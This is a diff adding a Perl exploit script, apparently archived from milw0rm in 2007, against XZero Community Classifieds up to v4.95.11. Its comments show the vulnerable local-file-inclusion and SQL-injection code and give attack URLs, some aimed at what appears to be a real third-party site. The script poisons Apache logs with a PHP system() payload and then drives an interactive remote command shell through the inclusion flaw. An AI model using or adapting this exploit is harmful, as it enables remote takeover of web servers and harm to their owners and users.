@@ -1,0 +1,129 @@
+#!/usr/bin/perl
+#
+# XZero Community Classifieds  <= v4.95.11 LFI & SQL Injection
+# linK : http://www.xzeroscripts.com
+# download: http://rapidshare.com/files/66809648/XZCl4.95.11.rar
+# original thread: http://en.rstzone.org/xzero-community-classifieds-v4-95-11-lfi-sql-in-t9394.rst
+# (c)od3d and f0unded by Kw3rLn from Romanian Security Team a.K.A http://rstzone.org
+#
+# Local file inclusion in index.php:
+#
+#  switch($xview)
+#        {
+#                      [ ..... ]
+#            case "page"            : $page = "$_GET[pagename].php";    break;
+#               [ ..... ]
+#        }
+#
+#  include_once($page);
+# in common.inc.php line 40: $xview = $_GET['view'] ? $_GET['view'] : "main";
+#
+# SQL Injection in post.php
+# line 511: $sql = "SELECT expireafter FROM $t_subcats WHERE subcatid = $_REQUEST[subcatid]";
+# ( And more but useless cuz admin password is in config.inc.php)
+#
+# LFI: http://site.com/index.php?view=page&pagename=[Local_FIle]%00
+# Example: http://www.diasporaromana.com/index.php?view=page&pagename=tetete
+#
+# SQL: http://site.com/index.php?view=post&cityid=2&lang=en&catid=2&subcatid=[SQL]
+# Example: http://www.diasporaromana.com/index.php?view=post&cityid=220&lang=en&catid=5&subcatid=18'
+#
+# And now exploit for LFI
+
+use IO::Socket;
+use LWP::Simple;
+
+
+@apache=(
+"../../../../../var/log/httpd/access_log",
+"../../../../../var/log/httpd/error_log",
+"../apache/logs/error.log",
+"../apache/logs/access.log",
+"../../apache/logs/error.log",
+"../../apache/logs/access.log",
+"../../../apache/logs/error.log",
+"../../../apache/logs/access.log",
+"../../../../apache/logs/error.log",
+"../../../../apache/logs/access.log",
+"../../../../../apache/logs/error.log",
+"../../../../../apache/logs/access.log",
+"../logs/error.log",
+"../logs/access.log",
+"../../logs/error.log",
+"../../logs/access.log",
+"../../../logs/error.log",
+"../../../logs/access.log",
+"../../../../logs/error.log",
+"../../../../logs/access.log",
+"../../../../../logs/error.log",
+"../../../../../logs/access.log",
+"../../../../../etc/httpd/logs/access_log",
+"../../../../../etc/httpd/logs/access.log",
+"../../../../../etc/httpd/logs/error_log",
+"../../../../../etc/httpd/logs/error.log",
+"../../.. /../../var/www/logs/access_log",
+"../../../../../var/www/logs/access.log",
+"../../../../../usr/local/apache/logs/access_log",
+"../../../../../usr/local/apache/logs/access.log",
+"../../../../../var/log/apache/access_log",
+"../../../../../var/log/apache/access.log",
+"../../../../../var/log/access_log",
+"../../../../../var/www/logs/error_log",
+"../../../../../var/www/logs/error.log",
+"../../../../../usr/local/apache/logs/error_log",
+"../../../../../usr/local/apache/logs/error.log",
+"../../../../../var/log/apache/error_log",
+"../../../../../var/log/apache/error.log",
+"../../../../../var/log/ access_log",
+"../../../../../var/log/error_log"
+);
+
+print "[RST] XZero Community Classifieds <= v4.95.11 Remote Command Execution Exploit\n";
+print "[RST] need magic_quotes_gpc = off\n";
+print "[RST] c0ded by Kw3rLN from Romanian Security Team [ http://rstzone.org ] \n\n";
+
+
+if (@ARGV < 3)
+{
+    print "[RST] Usage: xzero.pl [host] [path] [apache_path]\n\n";
+    print "[RST] Apache Path: \n";
+    $i = 0;
+    while($apache[$i])
+    { print "[$i] $apache[$i]\n";$i++;}
+    exit();
+}
+
+$host=$ARGV[0];
+$path=$ARGV[1];
+$apachepath=$ARGV[2];
+
+print "[RST] Injecting some code in log files...\n";
+$CODE="<?php ob_clean();system(\$HTTP_COOKIE_VARS[cmd]);die;?>";
+$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", PeerPort=>"80") or die "[RST] Could not connect to host.\n\n";
+print $socket "GET ".$path.$CODE." HTTP/1.1\r\n";
+print $socket "User-Agent: ".$CODE."\r\n";
+print $socket "Host: ".$host."\r\n";
+print $socket "Connection: close\r\n\r\n";
+close($socket);
+print "[RST] Shell!! write q to exit !\n";
+print "[RST] IF not working try another apache path\n\n";
+
+print "[shell] ";$cmd = <STDIN>;
+
+while($cmd !~ "q") {
+    $socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", PeerPort=>"80") or die "[RST] Could not connect to host.\n\n";
+
+    print $socket "GET ".$path."index.php?view=page&pagename=".$apache[$apachepath]."%00&cmd=$cmd HTTP/1.1\r\n";
+    print $socket "Host: ".$host."\r\n";
+    print $socket "Accept: */*\r\n";
+    print $socket "Connection: close\r\n\n";
+
+    while ($raspuns = <$socket>)
+    {
+        print $raspuns;
+    }
+    print "[shell] ";
+    $cmd = <STDIN>;
+}
+
+# milw0rm.com [2007-12-26]
